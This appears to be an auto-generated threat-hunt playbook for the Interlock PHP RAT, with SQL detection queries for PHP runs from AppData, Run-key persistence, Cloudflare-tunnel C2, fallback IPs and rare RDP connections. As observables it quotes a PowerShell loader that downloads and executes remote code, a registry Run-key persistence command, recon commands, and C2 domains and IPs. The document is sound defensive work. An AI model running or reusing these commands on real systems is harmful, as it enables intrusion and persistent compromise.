---
analysis: A single rule on registry Run keys is easily bypassed by changing paths.
  This hunt correlates process execution from writable paths, specific registry patterns,
  Cloudflare tunnel usage, and fallback IP connections into a single triage session,
  providing a multi-surface context no single rule can offer.
blind_spots:
- id: no-agent-coverage
  owner: Infrastructure Team
  question: Are there unmanaged hosts running PHP in this directory?
  remediation: Audit unmanaged assets and install agents on all user workstations.
  requires: Endpoint agent coverage on all hosts
  risk: A host without an agent will not contribute process or registry logs, leaving
    a gap in the hunt's visibility.
- id: rdp-logon-context
  owner: Identity Team
  question: What was the logon type for the RDP connections?
  remediation: Configure enhanced RDP logging to include logon types in sign-in events.
  requires: hb_auth_signin with logon type
  risk: RDP connections without authentication context can be misidentified; an automated
    script vs an interactive logon is a critical distinction.
  stage: lateral-movement-rdp
coverage:
- stage: c2-and-fallback-communications
  status: covered
  steps:
  - c2-dns-cloudflare
  - c2-network-fallback
- stage: registry-run-key-persistence
  status: covered
  steps:
  - persistence-run-keys
- stage: lateral-movement-rdp
  status: covered
  steps:
  - rdp-lateral-baseline
- reason: Handled in the initial access hunt of this series.
  stage: initial-access-social-engineering
  status: out_of_scope
- reason: Handled in the deployment hunt of this series.
  stage: powershell-loader-execution
  status: out_of_scope
- reason: Handled in the deployment hunt of this series.
  stage: interlock-php-rat-deployment
  status: out_of_scope
- reason: Handled in the reconnaissance hunt of this series.
  stage: automated-reconnaissance
  status: out_of_scope
- reason: Handled in the reconnaissance hunt of this series.
  stage: hands-on-domain-discovery
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: The Interlock ransomware group is high-impact. Their shift to PHP-based
    variants suggests an attempt to evade existing Node.js-specific detections. A
    hunt over the entire estate for this persistence and C2 pattern is necessary to
    ensure no persistent infections remain.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has maintained access using a PHP-based RAT persisting via
  registry Run keys and is moving laterally through the environment using RDP.
labels:
- hunt
- attack.t1547.001
- attack.t1572
- attack.t1102.003
- attack.t1021.001
name: 'Interlock PHP RAT: Persistence and Lateral Movement'
parameters:
  c2_domains:
    default:
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    - galleries-physicians-psp-wv.trycloudflare.com
    - evidence-deleted-procedure-bringing.trycloudflare.com
    - nowhere-locked-manor-hs.trycloudflare.com
    - ranked-accordingly-ab-hired.trycloudflare.com
    description: C2 domains identified in the research.
    from:
      kind: article
      observed: '2025-07-14'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[domain]
  fallback_ips:
    default:
    - 64.95.12.71
    - 184.95.51.165
    description: Hardcoded fallback C2 IPs.
    from:
      kind: article
      observed: '2025-07-14'
      ref: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    type: list[ip]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    from:
      kind: manual
      observed: '2025-07-20'
      ref: hunt-standard
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
    gates:
    - design-checks
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus the search on standard user endpoints first. If no activity is found
  on the trycloudflare subdomains, broaden the search to look for any process executing
  from AppData\Roaming\php\.
references:
- name: "The DFIR Report \u2014 KongTuke FileFix Leads to New Interlock RAT Variant"
  url: https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
related:
- hunt: interlock-rat-initial-access
  reason: Initial access via KongTuke scripts and social engineering is handled in
    a separate hunt focused on web-injects.
  relation: out-of-scope-alternative
- hunt: interlock-rat-reconnaissance
  reason: The automated reconnaissance commands used by the RAT are high-volume and
    better suited for a dedicated recon-focused hunt.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Social Engineering Web-Inject
    observables:
    - Single-line script hidden in HTML
    - Fake captcha 'Verify you are human'
    - User instructed to open Run command and paste from clipboard
    slug: initial-access-social-engineering
    tactic: initial-access
    techniques:
    - T1189
    - T1204.001
  - name: PowerShell Loader Execution
    observables:
    - powershell.exe -ep Bypass -w H -c "schtasks /delete /tn Updater /f; $w=New-Object
      System.Net.WebClient ; $w.Headers.Add(\"User-Agent\", \"PowerShell\") ; $w.DownloadString(\"http://deadly-programming-attorneys-our.trycloudflare.com\")
      | iex"
    - deadly-programming-attorneys-our.trycloudflare.com
    slug: powershell-loader-execution
    tactic: execution
    techniques:
    - T1059.001
    - T1105
    - T1562.001
  - name: Interlock PHP RAT Deployment
    observables:
    - C:\Users\REDACTED\AppData\Roaming\php\php.exe -d extension=zip -d extension_dir=ext
      C:\Users\\AppData\Roaming\php\wefs.cfg 1
    - AppData\Roaming\php\php.exe
    - AppData\Roaming\php\wefs.cfg
    slug: interlock-php-rat-deployment
    tactic: execution
    techniques:
    - T1059
  - name: Automated System Profiling
    observables:
    - Get-NetNeighbor -AddressFamily IPv4
    - systeminfo /FO CSV
    - tasklist /svc /FO CSV
    - Get-Service
    - Get-PSDrive -PSProvider FileSystem
    - '[Security.Principal.WindowsIdentity]::GetCurrent()'
    slug: automated-reconnaissance
    tactic: discovery
    techniques:
    - T1016
    - T1082
    - T1057
    - T1007
    - T1033
    - T1083
  - name: Interactive Domain & Backup Discovery
    observables:
    - '[adsiSearcher]"(ObjectClass=computer)"'
    - 'nltest /dclist:'
    - net user %USERNAME% /domain
    - Regex matching VB|VBR|VEEA|VEEAM|BCK|BACK to find backup servers
    - whoami
    slug: hands-on-domain-discovery
    tactic: discovery
    techniques:
    - T1018
    - T1087.002
    - T1482
  - name: Cloudflare Tunnel C2
    observables:
    - existed-bunch-balance-councils.trycloudflare.com
    - ferrari-rolling-facilities-lounge.trycloudflare.com
    - galleries-physicians-psp-wv.trycloudflare.com
    - 64.95.12.71
    - 184.95.51.165
    slug: c2-and-fallback-communications
    tactic: command-and-control
    techniques:
    - T1572
    - T1102.003
  - name: Registry Run Key Persistence
    observables:
    - reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "REDACTED" /t
      REG_SZ /d ""C:\Users\REDACTED\AppData\Roaming\php\php.exe" "C:\Users\REDACTED\AppData\Roaming\php\wefs.cfg""
      /f
    slug: registry-run-key-persistence
    tactic: persistence
    techniques:
    - T1547.001
  - name: Lateral Movement via RDP
    observables:
    - RDP connections to internal hosts
    slug: lateral-movement-rdp
    tactic: lateral-movement
    techniques:
    - T1021.001
  summary: The Interlock ransomware group has introduced a PHP-based Remote Access
    Trojan (RAT) variant, delivered via the KongTuke campaign using social engineering
    and malicious PowerShell scripts. The malware establishes a command-and-control
    channel through Cloudflare Tunnels and fallback IPs, performs extensive host and
    domain reconnaissance, and maintains persistence via registry run keys to facilitate
    lateral movement through RDP.
series:
  index: 3
  slug: kongtuke-filefix-leads-to-new-interlock-rat-variant
  title: KongTuke FileFix Leads to New Interlock RAT Variant
  total: 3
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
tlp: clear
type: investigation
---


# Interlock PHP RAT: Persistence and Lateral Movement

This hunt targets the late-stage behavior of the Interlock PHP RAT, specifically looking for the execution of PHP interpreters from user-writable AppData paths, persistence via registry Run keys loading encrypted .cfg files, and anomalous internal RDP traffic indicative of lateral movement. It also examines network telemetry for Cloudflare Tunnel C2 activity and fallback connections to hardcoded IP addresses.

## php-execution-roaming
<!-- PHP execution from AppData Roaming -->
Identify hosts running PHP interpreters from non-standard user profile paths, a hallmark of the Interlock PHP RAT deployment.

```sqlite target=endpoint role=scoping params=(lookback_days=lookback_days)
~~~yaml
expected: A PHP process running from a user profile directory loading a configuration
  file. Silence means no PHP binaries matched these specific command-line strings.
reads:
- device_hostname
- process_path
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: none
~~~
SELECT device_hostname, process_path, process_cmd_line, user_name, time FROM hb_process_activity WHERE (LOWER(process_path) LIKE '%\appdata\roaming\php\%.exe' OR LOWER(process_name) LIKE '%php%') AND (LOWER(process_cmd_line) LIKE '%wefs.cfg%' OR LOWER(process_cmd_line) LIKE '%config.cfg%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## workstreams
<!-- Corroborate C2 and Persistence -->
parallel:
- → persistence-run-keys
- → c2-dns-cloudflare
- → c2-network-fallback
- → rdp-lateral-baseline
join: → triage-agent

## persistence-run-keys
<!-- Registry Run-key persistence for PHP -->
Find the registry entry used to maintain access after reboots.

```sqlite target=endpoint role=detection-candidate params=(lookback_days=lookback_days)
~~~yaml
expected: A Run key entry pointing to a PHP binary and a .cfg file in AppData. This
  matches the known persistence mechanism.
reads:
- device_hostname
- reg_target
- reg_value_data
- time
silence: not_evidence_of_absence
source: hb_registry_activity
verified: none
~~~
SELECT device_hostname, reg_target, reg_value_data, time FROM hb_registry_activity WHERE LOWER(reg_target) LIKE '%\currentversion\run%' AND LOWER(reg_value_data) LIKE '%php.exe%' AND LOWER(reg_value_data) LIKE '%.cfg%' AND time >= datetime('now', '-{{lookback_days}} days')
```

## c2-dns-cloudflare
<!-- DNS queries to Cloudflare Tunnels -->
Identify process-driven DNS requests to the trycloudflare.com domains named in the report.

```sqlite target=endpoint role=enrichment params=(lookback_days=lookback_days, c2_domains=c2_domains)
~~~yaml
expected: Specific trycloudflare subdomains being resolved by PHP or PowerShell. Silence
  means these domains were not queried.
reads:
- device_hostname
- process_name
- query_hostname
- time
silence: not_evidence_of_absence
source: hb_dns_activity
verified: none
~~~
SELECT device_hostname, process_name, query_hostname, time FROM hb_dns_activity WHERE (instr(',' || '{{c2_domains}}' || ',', ',' || LOWER(query_hostname) || ',') > 0 OR (LOWER(query_hostname) LIKE '%.trycloudflare.com' AND (LOWER(process_name) LIKE '%php%' OR LOWER(process_name) LIKE '%powershell%'))) AND time >= datetime('now', '-{{lookback_days}} days')
```

## c2-network-fallback
<!-- Direct connections to fallback IPs -->
Check for network activity to hardcoded fallback IPs that bypass DNS entirely.

```sqlite target=network role=enrichment params=(lookback_days=lookback_days, fallback_ips=fallback_ips)
~~~yaml
expected: Connections to fallback IPs. Any such row is highly suspicious as these
  IPs have no legitimate business purpose in most networks.
reads:
- device_hostname
- dst_endpoint_ip
- dst_endpoint_port
- process_name
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: none
~~~
SELECT device_hostname, dst_endpoint_ip, dst_endpoint_port, process_name, time FROM hb_network_connection WHERE instr(',' || '{{fallback_ips}}' || ',', ',' || dst_endpoint_ip || ',') > 0 AND time >= datetime('now', '-{{lookback_days}} days')
```

## rdp-lateral-baseline
<!-- Stacking internal RDP connections -->
Identify rare RDP lateral movement targets that differ from standard administrative patterns.

```sqlite target=network role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A list of hosts making infrequent RDP connections to internal peers. Common
  admin jumps will have high counts; lateral movement will likely be a rare pair.
prevalence:
  by: device_hostname
  key:
  - dst_endpoint_ip
  rare_below: 3
reads:
- device_hostname
- dst_endpoint_ip
- direction
- time
silence: not_evidence_of_absence
source: hb_network_connection
verified: none
~~~
SELECT device_hostname, dst_endpoint_ip, COUNT(*) AS connection_count, MIN(time) AS first_seen FROM hb_network_connection WHERE dst_endpoint_port = 3389 AND direction = 'outbound' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY device_hostname, dst_endpoint_ip HAVING connection_count <= 5 ORDER BY connection_count ASC
```

## triage-agent
<!-- Weigh the Interlock RAT evidence -->
```agent target=hunter
cite: required
context:
- php-execution-roaming
- persistence-run-keys
- c2-dns-cloudflare
- c2-network-fallback
- rdp-lateral-baseline
max_iterations: 5
objective: Determine if any host exhibits a combination of PHP profile execution,
  registry persistence for that PHP binary, and outbound C2 or anomalous internal
  RDP connections.
success_criteria: A per-host verdict of malicious | suspicious | benign with a justification
  citing specific rows from at least two different surfaces.
tools:
- endpoint
- network
```

## decision-route
<!-- Route on Verdict -->
if~: "The triage verdict identifies at least one host as 'malicious' with multiple corroborating surfaces." (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: no-agent-coverage)
else: → analyst-review

## isolate-host
<!-- Isolate Endpoint -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host immediately. Do not reboot. Prepare for forensic imaging of the AppData directory and registry hives.
```
→ analyst-review

## analyst-review
<!-- Analyst Review and Verification -->
```manual target=analyst
Review the agent's triage notes. Specifically, verify the rare RDP destinations identified. Determine if the .cfg files are consistent with Interlock's encryption format.
```
→ close-out

## close-out
<!-- Close out Hunt -->
```manual target=analyst
Document the findings. If malicious activity was found, pivot to Incident Response. If not, consider adding trycloudflare.com lookups from user profiles to your standing detection rules.
```
→ end
